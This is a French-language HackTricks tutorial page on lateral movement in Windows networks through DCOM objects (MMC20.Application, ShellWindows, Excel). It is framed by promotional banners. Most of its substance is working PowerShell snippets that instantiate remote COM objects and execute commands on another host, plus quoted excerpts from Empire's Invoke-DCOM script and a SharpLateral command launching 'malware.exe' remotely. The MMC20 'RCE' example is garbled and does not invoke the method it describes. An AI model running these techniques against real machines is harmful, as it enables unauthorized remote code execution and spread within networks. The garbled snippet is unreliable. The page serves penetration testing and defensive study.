# DCOM Exec

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

**Groupe de sécurité Try Hard**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## MMC20.Application

**Pour plus d'informations sur cette technique, consultez l'article original sur [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**


Le modèle d'objet de composant distribué (DCOM) présente une capacité intéressante pour les interactions basées sur le réseau avec des objets. Microsoft fournit une documentation complète pour à la fois DCOM et le modèle d'objet de composant (COM), accessible [ici pour DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) et [ici pour COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Une liste des applications DCOM peut être récupérée en utilisant la commande PowerShell :
```bash
Get-CimInstance Win32_DCOMApplication
```
L'objet COM, [Classe d'application MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permet le scriptage des opérations de module enfichable MMC. Notamment, cet objet contient une méthode `ExecuteShellCommand` sous `Document.ActiveView`. Plus d'informations sur cette méthode peuvent être trouvées [ici](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Vérifiez en exécutant :

Cette fonctionnalité facilite l'exécution de commandes sur un réseau via une application DCOM. Pour interagir avec DCOM à distance en tant qu'administrateur, PowerShell peut être utilisé comme suit :
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Ce commandement se connecte à l'application DCOM et renvoie une instance de l'objet COM. La méthode ExecuteShellCommand peut ensuite être invoquée pour exécuter un processus sur l'hôte distant. Le processus implique les étapes suivantes:

Vérifier les méthodes:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Obtenir un accès à distance (RCE) :
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Pour plus d'informations sur cette technique, consultez l'article original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

L'objet **MMC20.Application** a été identifié comme manquant de "LaunchPermissions" explicites, se contentant des autorisations permettant l'accès aux administrateurs. Pour plus de détails, un fil peut être exploré [ici](https://twitter.com/tiraniddo/status/817532039771525120), et l'utilisation de [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET pour filtrer les objets sans autorisation de lancement explicite est recommandée.

Deux objets spécifiques, `ShellBrowserWindow` et `ShellWindows`, ont été mis en évidence en raison de leur absence d'autorisations de lancement explicites. L'absence d'une entrée de registre `LaunchPermission` sous `HKCR:\AppID\{guid}` signifie l'absence d'autorisations explicites.

###  ShellWindows
Pour `ShellWindows`, qui ne possède pas de ProgID, les méthodes .NET `Type.GetTypeFromCLSID` et `Activator.CreateInstance` facilitent l'instanciation d'objets en utilisant son AppID. Ce processus exploite OleView .NET pour récupérer le CLSID de `ShellWindows`. Une fois instancié, l'interaction est possible via la méthode `WindowsShell.Item`, conduisant à l'invocation de méthodes telles que `Document.Application.ShellExecute`.

Des commandes PowerShell d'exemple ont été fournies pour instancier l'objet et exécuter des commandes à distance:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Mouvement latéral avec les objets DCOM Excel

Le mouvement latéral peut être réalisé en exploitant les objets DCOM Excel. Pour des informations détaillées, il est conseillé de lire la discussion sur l'utilisation de Excel DDE pour le mouvement latéral via DCOM sur le [blog de Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Le projet Empire fournit un script PowerShell, qui démontre l'utilisation d'Excel pour l'exécution de code à distance (RCE) en manipulant des objets DCOM. Ci-dessous des extraits du script disponible sur le [dépôt GitHub d'Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), montrant différentes méthodes pour abuser d'Excel pour le RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Outils d'automatisation pour le Mouvement Latéral

Deux outils sont mis en avant pour automatiser ces techniques :

- **Invoke-DCOM.ps1** : Un script PowerShell fourni par le projet Empire qui simplifie l'invocation de différentes méthodes pour exécuter du code sur des machines distantes. Ce script est accessible dans le dépôt GitHub d'Empire.

- **SharpLateral** : Un outil conçu pour exécuter du code à distance, qui peut être utilisé avec la commande :
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Outils Automatiques

* Le script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) permet d'invoquer facilement toutes les méthodes commentées pour exécuter du code sur d'autres machines.
* Vous pourriez également utiliser [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Références

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

**Groupe de sécurité Try Hard**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
